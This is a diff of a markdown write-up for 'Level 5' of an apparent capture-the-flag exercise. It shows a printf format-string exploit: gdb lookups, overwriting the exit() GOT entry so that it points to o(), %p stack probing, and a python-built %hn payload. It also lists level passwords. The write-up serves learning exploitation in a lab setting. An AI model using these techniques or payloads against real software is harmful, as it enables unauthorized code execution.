@@ -1,5 +1,5 @@
 # Level 5
-*password : b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa*
+*password : 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a*
 
 ```
 $ scp -P 4242 level5@192.168.56.108:level5 .
@@ -7,22 +7,17 @@ $ scp -P 4242 level5@192.168.56.108:level5 .
 
 ## Printf exploit
 
-objective : use printf to execute o().
-way : change the return address of exit()
+- use printf to execute o().
+- replace the return address of exit() by o()
 
 ```
 $ gdb level5
 (gdb) info funct o
-All functions matching regular expression "o":
-
-Non-debugging symbols:
-0x080483c0  __gmon_start__
-0x080483c0  __gmon_start__@plt
-0x08048420  __do_global_dtors_aux
+...
 0x080484a4  o
-0x080485a0  __do_global_ctors_aux
+...
 ```
-
+- get exit() return address
 ```
 (gdb) disas n
 ...
@@ -39,16 +34,17 @@ End of assembler dump.
 `exit()` : 0x08049838
 
 
-convert o() to decimal : 134513828 (too long)\
-separate into 2 int :
-- 804 => 2052
-- 84a4 => 33956
+- convert o() address to decimal : 134513828 (too long)\
+- split the address into 2 int :
+   - 804 = 2052
+   - 84a4 = 33956
 
 ```
 $ python -c 'print "\x38\x98\x04\x08 %p %p %p %p"' | ./level5
+8 0x200 0xb7fd1ac0 0xb7ff37d0 0x8049838
 ```
 
-address at parameters 4th.
+address of `exit()` at parameter 4th.
 
 ```
 $ python -c 'print "\x38\x98\x04\x08" + "%2048x" + "%4$hn" + "%31904x"+ "%4$hn"' > /tmp/level5
